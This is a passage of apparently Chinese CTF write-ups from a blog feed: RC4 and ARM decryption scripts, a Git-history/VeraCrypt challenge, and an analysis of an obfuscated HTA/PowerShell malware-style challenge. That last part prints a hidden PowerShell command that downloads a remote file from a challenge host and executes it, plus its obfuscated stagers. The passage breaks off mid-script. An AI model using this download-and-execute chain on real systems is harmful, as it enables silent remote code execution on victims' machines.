class="hljs-built_in">zip</span>(ciphertext, keystream)])<br>    <span class="hljs-keyword">return</span> plaintext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key = <span class="hljs-string">&quot;82ns65ig1&quot;</span><br>    ciphertext = <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-number">0x95</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x85</span>,<br>        <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x73</span><br>    ])<br><br>    plaintext = rc4_decrypt(ciphertext, key)<br>    <span class="hljs-built_in">print</span>(plaintext.decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>))<br>//flag&#123;aj5oyjs1kf&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2025-RE</title>
    <link href="/2025/09/23/WMCTF2025-RE/"/>
    <url>/2025/09/23/WMCTF2025-RE/</url>
    
    <content type="html"><![CDATA[<h1 id="WMCTF2025-re"><a href="#WMCTF2025-re" class="headerlink" title="WMCTF2025-re"></a>WMCTF2025-re</h1><h2 id="catfriend"><a href="#catfriend" class="headerlink" title="catfriend"></a>catfriend</h2><p>查找字符串WMCTF{5a3e8f2b-1c7d-4a6f-b89e-0d3c2f1a4b5c}</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509232110485.png" alt="image-20250923210809834"></p><h2 id="appfriend"><a href="#appfriend" class="headerlink" title="appfriend"></a>appfriend</h2><p>待更新…</p>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2025-GitHacker</title>
    <link href="/2025/09/23/WMCTF2025/"/>
    <url>/2025/09/23/WMCTF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc-——GitHacker"><a href="#Misc-——GitHacker" class="headerlink" title="Misc ——GitHacker"></a>Misc ——GitHacker</h1><p>比赛的时候没做出来，赛后看了su师傅们的思路才复现出~</p><p>这是一道关于git库的题，一般这种题的做题思路就是找提交的日志记录，看看能不能找到有用的信息</p><p>先用这个命令查看日志记录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">git reflog<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509231924497.png" alt="image-20250923192403391"></p><p>然后查看给出的这两个file</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509231929705.png" alt="image-20250923192941652"></p><p>显示的是png和jpg后缀</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"> git show <span class="hljs-number">6</span>ec92bc<br>commit <span class="hljs-number">6</span>ec92bcfdf3044bf21dcfa74500cbb929c0f0037<br>Author: toto &lt;toto@WMCTF2025.com&gt;<br>Date:   Sat Aug <span class="hljs-number">9</span> <span class="hljs-number">17</span>:<span class="hljs-number">14</span>:<span class="hljs-number">06</span> <span class="hljs-number">2025</span> +<span class="hljs-number">0800</span><br><br>    encryptedFile<br><br><span class="hljs-built_in">diff</span> <span class="hljs-literal">--git</span> a/image.png b/image.png<br>new file mode <span class="hljs-number">100644</span><br>index <span class="hljs-number">0000000</span>..<span class="hljs-number">27</span>e6acd<br>Binary files /dev/null and b/image.png differ<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> E:\下载的附件\GitHacker&gt; git show d504bbf<br>commit d504bbf75693fc83f6cf5c873306b7fc67edd804<br>Author: toto &lt;toto@WMCTF2025.com&gt;<br>Date:   Sat Aug <span class="hljs-number">9</span> <span class="hljs-number">17</span>:<span class="hljs-number">23</span>:<span class="hljs-number">51</span> <span class="hljs-number">2025</span> +<span class="hljs-number">0800</span><br><br>    encryptedFile<br><br><span class="hljs-built_in">diff</span> <span class="hljs-literal">--git</span> a/image.jpg b/image.jpg<br>new file mode <span class="hljs-number">100644</span><br>index <span class="hljs-number">0000000</span>..a3a40e3<br>Binary files /dev/null and b/image.jpg differ<br></code></pre></td></tr></table></figure><p>一开始也是想着往图片隐写的方向去，也能明显的看出两个图片都很大，题目也给了提示其实不是图片文件，这里卡了好久，用的是vc容器挂载，所以得要得到密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">a026274 HEAD<span class="hljs-selector-tag">@</span>&#123;<span class="hljs-number">6</span>&#125;: commit: password<br></code></pre></td></tr></table></figure><p>日志记录这一行已经显示password</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> E:\下载的附件\GitHacker&gt; git show a026274<br>commit a026274fb418ec88af16444644fccab9b8a7e8dd (HEAD)<br>Author: toto &lt;toto@WMCTF2025.com&gt;<br>Date:   Sat Aug <span class="hljs-number">9</span> <span class="hljs-number">17</span>:<span class="hljs-number">14</span>:<span class="hljs-number">40</span> <span class="hljs-number">2025</span> +<span class="hljs-number">0800</span><br><br>    password<br><br><span class="hljs-built_in">diff</span> <span class="hljs-literal">--git</span> a/password.md b/password.md<br>new file mode <span class="hljs-number">100644</span><br>index <span class="hljs-number">0000000</span>..<span class="hljs-number">1</span>ab140f<br><span class="hljs-literal">---</span> /dev/null<br>+++ b/password.md<br><span class="hljs-selector-tag">@</span><span class="hljs-selector-tag">@</span> <span class="hljs-literal">-0</span>,<span class="hljs-number">0</span> +<span class="hljs-number">1</span> <span class="hljs-selector-tag">@</span><span class="hljs-selector-tag">@</span><br>+<span class="hljs-string">&quot;EasyP@ssw0rd_from_Git_History&quot;</span><br></code></pre></td></tr></table></figure><p>命令显示密码EasyP@ssw0rd_from_Git_History</p><p>这个密码也可以通过查看blob的内容得到（即查看提交的日志），在objects里查看</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> E:\下载的附件\GitHacker&gt; git <span class="hljs-built_in">cat</span><span class="hljs-operator">-file</span> <span class="hljs-literal">-p</span> <span class="hljs-number">1</span>ab140f15f5fde379ed6a8da68eedef4818adcbb<br><span class="hljs-string">&quot;EasyP@ssw0rd_from_Git_History&quot;</span><br></code></pre></td></tr></table></figure><p>用vc挂载后得到flag第一部分</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509231941800.png" alt="image-20250923194119759"></p><p>WMCTF{G00d_J0b_F1nding_Th3_0ld_V3rsi0n_</p><p>当时固定思维想找另一个密码，看完了所有文件都没有找到密码</p><p>当时也想过是从文件本身上找问题，但是一直没什么成果</p><p>后面复现看其他师傅的分析下知道了这两个文件的文件头不一样,用010对照看一下</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509231951210.png" alt="image-20250923195141089"></p><p>这里看了0raN9e师傅的wp，给了一个vc的官方恢复卷头的链接</p><p>按照步骤</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509232023932.png" alt="image-20250923202329881"></p><p>选择image.png文件 &lt; 工具 &lt; 备份加密卷头信息 &lt; 输入密码 &lt; 不包含隐藏 &lt; 最后随意保存一个文件</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509232027981.png" alt="image-20250923202721944"></p><p>然后就是恢复image.jpg了，</p><p>选择image.jpg &gt; 工具 &gt; 恢复加密卷头信息 &gt; 选择你保存的那个备份加密卷 &gt; 输入密码</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202509232039810.png" alt="image-20250923203900760"></p><p>And_Y0u_M4ster_The_VeraCrypt_H34der_Trick!}</p>]]></content>
    
    
    <categories>
      
      <category>Misc比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LILCTF2025逆向题解</title>
    <link href="/2025/08/28/LILCTF2025%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/08/28/LILCTF2025%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="LILCTF-2025"><a href="#LILCTF-2025" class="headerlink" title="LILCTF 2025"></a>LILCTF 2025</h1><h2 id="ARM-ASM"><a href="#ARM-ASM" class="headerlink" title="ARM ASM"></a>ARM ASM</h2><p>先用jadx看，找到密文</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231925628.png" alt="img"></p><p>反编译so文件，找到主函数，这里一共分为三处加密，第一处通过t表进行重新排列和按位xor，第二处对每三字节进行左循环移3位，右循环移1位，不变的变换，第三处用base64变表的加密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231925646.png" alt="img"></p><p>这里可以找到t表的内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508231926445.png" alt="img"></p><p>将以上加密过程逆过来写解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">CUSTOM = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/&quot;</span><br><br>decode_map = &#123;ch:i <span class="hljs-keyword">for</span> i,ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(CUSTOM)&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_b64decode</span>(<span class="hljs-params">s</span>):<br>    out = <span class="hljs-built_in">bytearray</span>()<br>    buf=[]; pad=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> ch == <span class="hljs-string">&#x27;=&#x27;</span>:<br>            pad += <span class="hljs-number">1</span>; buf.append(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            buf.append(decode_map[ch])<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(buf)==<span class="hljs-number">4</span>:<br>            b0 = (buf[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">2</span>) | (buf[<span class="hljs-number">1</span>]&gt;&gt;<span class="hljs-number">4</span>)<br>            b1 = ((buf[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xF</span>)&lt;&lt;<span class="hljs-number">4</span>) | (buf[<span class="hljs-number">2</span>]&gt;&gt;<span class="hljs-number">2</span>)<br>            b2 = ((buf[<span class="hljs-number">2</span>]&amp;<span class="hljs-number">3</span>)&lt;&lt;<span class="hljs-number">6</span>) | buf[<span class="hljs-number">3</span>]<br>            out.extend([b0,b1,b2])<br>            buf=[]<br>    <span class="hljs-keyword">if</span> pad: out = out[:-pad]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">x,r</span>): <span class="hljs-keyword">return</span> ((x&gt;&gt;r) | ((x &amp; ((<span class="hljs-number">1</span>&lt;&lt;r)-<span class="hljs-number">1</span>))&lt;&lt;(<span class="hljs-number">8</span>-r))) &amp; <span class="hljs-number">0xFF</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol</span>(<span class="hljs-params">x,r</span>): <span class="hljs-keyword">return</span> ((x&lt;&lt;r) | (x&gt;&gt;(<span class="hljs-number">8</span>-r))) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_neon_block</span>(<span class="hljs-params">Y, t</span>):<br>    z = [ y ^ (t[k] &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> k,y <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(Y) ]<br>    X = [<span class="hljs-number">0</span>]*<span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> k,j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(t):<br>        X[j] = z[k]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(X)<br><br>enc = <span class="hljs-string">&quot;KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S&quot;</span><br><br>data = custom_b64decode(enc)<br><br>buf = <span class="hljs-built_in">list</span>(data)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">48</span>, <span class="hljs-number">3</span>):<br>    buf[j]   = ror(buf[j],   <span class="hljs-number">3</span>)<br>    buf[j+<span class="hljs-number">1</span>] = rol(buf[j+<span class="hljs-number">1</span>], <span class="hljs-number">1</span>)<br>after_neon = <span class="hljs-built_in">bytes</span>(buf)<br><br><br>t0 = [<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0x0C</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x0A</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>]<br>t2 = [v ^ <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> t0]<br><br>X0 = inv_neon_block(after_neon[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>],  t0)<br>X1 = inv_neon_block(after_neon[<span class="hljs-number">16</span>:<span class="hljs-number">32</span>], t0)<br>X2 = inv_neon_block(after_neon[<span class="hljs-number">32</span>:<span class="hljs-number">48</span>], t2)<br><br>orig = (X0+X1+X2).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-built_in">print</span>(orig)<br><span class="hljs-comment"># -&gt; LILCTF&#123;ez_arm_asm_meow_meow_meow_meow_meow_meow&#125;</span><br></code></pre></td></tr></table></figure><h2 id="1’M-no7-A-rO6oT"><a href="#1’M-no7-A-rO6oT" class="headerlink" title="1’M no7 A rO6oT"></a>1’M no7 A rO6oT</h2><p>用vs看文本内容，得到看到这一串js代码，提取出来，发现这一段有好多混淆，这里我是利用python一步步解混淆的，可以直接梭，由于代码太长就不贴出来了</p><p>这是初始代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">resizeTo</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">moveTo</span>(-<span class="hljs-number">9999</span>, -<span class="hljs-number">9999</span>); <span class="hljs-variable constant_">SK</span>=<span class="hljs-number">102</span>;<span class="hljs-variable constant_">UP</span>=<span class="hljs-number">117</span>;tV=<span class="hljs-number">110</span>;<span class="hljs-title class_">Fx</span>=<span class="hljs-number">99</span>;nI=<span class="hljs-number">116</span>;pV=<span class="hljs-number">105</span>;wt=<span class="hljs-number">111</span>;<span class="hljs-variable constant_">RV</span>=<span class="hljs-number">32</span>;wV=<span class="hljs-number">82</span>;<span class="hljs-title class_">Rp</span>=<span class="hljs-number">106</span>;kz=<span class="hljs-number">81</span>;<span class="hljs-variable constant_">CX</span>=<span class="hljs-number">78</span>;<span class="hljs-variable constant_">GH</span>=<span class="hljs-number">40</span>;<span class="hljs-variable constant_">PS</span>=<span class="hljs-number">70</span>;<span class="hljs-variable constant_">YO</span>=<span class="hljs-number">86</span>;kF=<span class="hljs-number">75</span>;<br>......<br><span class="hljs-built_in">eval</span>(<span class="hljs-title class_">SxhM</span>); <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">close</span>();&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>解出第一步，中间内容省略（太长了）</p><p>这里贴出解出第一步代码的主要逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ioRjQN</span>(<span class="hljs-params">FVKq</span>)&#123;<br>    <span class="hljs-keyword">var</span> ohyLbg= <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> emGK = <span class="hljs-number">0</span>; emGK &lt; <span class="hljs-title class_">FVKq</span>.<span class="hljs-property">length</span>; emGK++)&#123;<br>        <span class="hljs-keyword">var</span> ndZC = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-title class_">FVKq</span>[emGK] - <span class="hljs-number">601</span>);<br>        ohyLbg = ohyLbg + ndZC<br>    &#125;<br>    <span class="hljs-keyword">return</span> ohyLbg<br>&#125;;<br><br><span class="hljs-keyword">var</span> ohyLbg = <span class="hljs-title function_">ioRjQN</span>([<span class="hljs-number">713</span>, <span class="hljs-number">712</span>, <span class="hljs-number">720</span>, ... , <span class="hljs-number">642</span>]);<br><span class="hljs-comment">// 这里 ohyLbg 就是被解密出来的实际 payload</span><br><br><span class="hljs-keyword">var</span> emGK = <span class="hljs-title function_">ioRjQN</span>([<span class="hljs-number">688</span>,<span class="hljs-number">684</span>,<span class="hljs-number">700</span>,<span class="hljs-number">715</span>,<span class="hljs-number">706</span>,<span class="hljs-number">713</span>,<span class="hljs-number">717</span>,<span class="hljs-number">647</span>,<span class="hljs-number">684</span>,<span class="hljs-number">705</span>,<span class="hljs-number">702</span>,<span class="hljs-number">709</span>,<span class="hljs-number">709</span>]);<br><span class="hljs-comment">// 这里解密出来的是一个 ActiveX 对象名字，例如 &quot;WScript.Shell&quot;</span><br><br><span class="hljs-keyword">var</span> ioRjQN = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(emGK);<br>ioRjQN.<span class="hljs-title class_">Run</span>(ohyLbg, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);<br><br></code></pre></td></tr></table></figure><p>第二层解出是一个powershell命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-w</span> <span class="hljs-number">1</span> <span class="hljs-literal">-ep</span> Unrestricted <span class="hljs-literal">-nop</span> `<br><span class="hljs-variable">$EFTE</span> = (<br>  [<span class="hljs-type">regex</span>]::Matches(<br>    <span class="hljs-string">&#x27;a5a9b49fb8adbe...（一大串16进制字符）...&#x27;</span>, <span class="hljs-string">&#x27;.&#123;2&#125;&#x27;</span><br>  ) | % &#123;<br>    [<span class="hljs-built_in">char</span>]([<span class="hljs-type">Convert</span>]::ToByte(<span class="hljs-variable">$_</span>.Value,<span class="hljs-number">16</span>) <span class="hljs-operator">-bxor</span> <span class="hljs-string">&#x27;204&#x27;</span>)<br>  &#125;<br>) <span class="hljs-operator">-join</span> <span class="hljs-string">&#x27;&#x27;</span>;<br><br>&amp; <span class="hljs-variable">$EFTE</span>.Substring(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>) <span class="hljs-variable">$EFTE</span>.Substring(<span class="hljs-number">3</span>)<br><br></code></pre></td></tr></table></figure><p>十六进制字符串 (<code>a5a9b49fb8adbe...</code>)被正则分成 2 位一组（即 <code>&quot;a5&quot;</code>, <code>&quot;a9&quot;</code>, <code>&quot;b4&quot;</code>…）。</p><p>转成字节再异或 204</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[<span class="hljs-symbol">Convert</span>]:<span class="hljs-link">:ToByte($_.Value,16) -bxor 204</span><br></code></pre></td></tr></table></figure><p>拼接成字符串，得到一个完整的命令&#x2F;脚本，赋值给 <code>$EFTE</code>。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&amp; <span class="hljs-variable">$EFTE</span><span class="hljs-selector-class">.Substring</span>(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>) <span class="hljs-variable">$EFTE</span><span class="hljs-selector-class">.Substring</span>(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><ul><li>拿 <code>$EFTE</code> 前 3 个字符作为程序名（可能是 <code>&quot;cmd&quot;</code> 或 <code>&quot;iex&quot;</code>）。</li><li>剩下部分是参数&#x2F;脚本。</li><li>最后动态执行。</li></ul><p>解密这一层得到第三层代码，</p><p>这段代码在隐藏窗口下启动powershell，然后执行’http:&#x2F;&#x2F;…&#x2F;bestudding.jpg，我们可以直接在浏览器窗口下载这个jpg</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">iex</span><span class="hljs-built_in">Start-Process</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:SystemRoot</span>\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&#x27;-w&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;-ep&#x27;</span>,<span class="hljs-string">&#x27;Unrestricted&#x27;</span>,<span class="hljs-string">&#x27;-Command&#x27;</span>,<span class="hljs-string">&quot;Set-Variable 3 &#x27;http://challenge.xinshi.fun:40341/bestudding.jpg&#x27;;SI Variable:/Z4D &#x27;Net.WebClient&#x27;;cd;SV c4H (.<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand.((<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand|Get-Member)[2].Name).Invoke(<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand.((<span class="hljs-variable">$ExecutionContext</span>.InvokeCommand|Get-Member|Where&#123;(GV _).Value.Name-clike&#x27;*dName&#x27;&#125;).Name).Invoke(&#x27;Ne*ct&#x27;,1,1))(LS Variable:/Z4D).Value);SV A ((((Get-Variable c4H -ValueO)|Get-Member)|Where&#123;(GV _).Value.Name-clike&#x27;*wn*d*g&#x27;&#125;).Name);&amp;([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))&quot;</span>;<br></code></pre></td></tr></table></figure><p>将图片用vs打开查看文本内容，得到这么一串</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(<span class="hljs-string">&#x27;(&#x27;</span> | % &#123; <span class="hljs-variable">$r</span> = + <span class="hljs-variable">$</span>() &#125; &#123; <span class="hljs-variable">$u</span> = <span class="hljs-variable">$r</span> &#125; &#123; <span class="hljs-variable">$b</span> = ++ <span class="hljs-variable">$r</span> &#125; &#123; <span class="hljs-variable">$q</span> = ( <span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$z</span> = ( <span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$o</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$d</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$h</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$e</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$i</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$x</span> = (<span class="hljs-variable">$q</span> *( <span class="hljs-variable">$z</span>) ) &#125; &#123; <span class="hljs-variable">$l</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>) &#125; &#123; <span class="hljs-variable">$g</span> = <span class="hljs-string">&quot;[&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125;)&quot;</span>[<span class="hljs-variable">$e</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125;)&quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>&quot;</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125; ) &quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>&quot;</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>?&quot;</span>[<span class="hljs-variable">$b</span> ] + <span class="hljs-string">&quot;]&quot;</span> &#125; &#123; <span class="hljs-variable">$r</span> = <span class="hljs-string">&quot;&quot;</span>.(<span class="hljs-string">&quot;<span class="hljs-variable">$</span>( @&#123;&#125; ) &quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>&quot;</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;&#125;) &quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$h</span>&quot;</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>( @&#123; &#125; )&quot;</span>[<span class="hljs-variable">$u</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;&#125; )&quot;</span>[<span class="hljs-variable">$o</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>? &quot;</span>[ <span class="hljs-variable">$b</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>( @&#123;&#125;)&quot;</span>[<span class="hljs-variable">$z</span> ]) &#125; &#123; <span class="hljs-variable">$r</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125; )&quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span>&quot;</span> + <span 